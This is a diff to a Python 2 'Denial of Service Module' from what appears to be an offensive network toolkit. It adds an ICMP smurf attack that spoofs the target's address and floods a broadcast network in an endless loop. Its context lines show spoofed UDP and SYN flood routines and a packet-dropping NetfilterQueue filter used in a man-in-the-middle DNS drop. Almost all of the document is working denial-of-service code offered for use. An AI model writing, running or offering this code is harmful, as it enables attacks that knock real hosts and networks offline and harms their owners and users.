@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.6"
+	version = "0.7"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -51,6 +51,19 @@ class Jam(object):
 		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 		self.t.terminate()
 		print "[-] Man-in-the-middle DNS drop finalized."
+
+        def callback(self, packet):
+                packet.drop()
+
+        def filter(self):
+                try:
+                        self.q = NetfilterQueue()
+                        self.q.bind(1, self.callback)
+                        self.q.run()
+                except Exception as e:
+                        print "[!] Exception caught: {}".format(e)
+
+
 
 
 	def udpfloodstart(self, host, tgt, dport):
@@ -77,7 +90,7 @@ class Jam(object):
 			pkt = IP_layer/UDP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
 		except:
-			print "[!] Error: check the parameters (target, interface, port)"
+			print "[!] Error: check the parameters (target, port)"
 
 	def synfloodstart(self, host, tgt, dport):
 		self.src = host
@@ -103,18 +116,22 @@ class Jam(object):
 			pkt = IP_layer/TCP_layer
 			send(pkt, loop=1, inter=0.0, verbose=False)
 		except:
-			print "[!] Error: check the parameters (target, interface, port)"
+			print "[!] Error: check the parameters (target, port)"
 
-	def callback(self, packet):
-                packet.drop()
 
-	def filter(self):
+	def icmpsmurfstart(self, tgt):
 		try:
-			self.q = NetfilterQueue()
-			self.q.bind(1, self.callback)
-			self.q.run()
-		except Exception as e:
-			print "[!] Exception caught: {}".format(e)
+			broadcast = raw_input("[+] Broadcast network address: ")
+			IP_layer = IP(src=tgt,dst=broadcast)
+			ICMP_layer = ICMP()
+			pkt = IP_layer/ICMP_layer
+			send(pkt, loop=1, inter=0.0, verbose=False)
+		except KeyboardInterrupt:
+			print
+		except:
+			print "[!] Error: check the parameters (target)"
 
-
+	def icmpsmurfstop(self):
+		print "[-] ICMP smurf denial of service finalized."
+		exit(0)
 
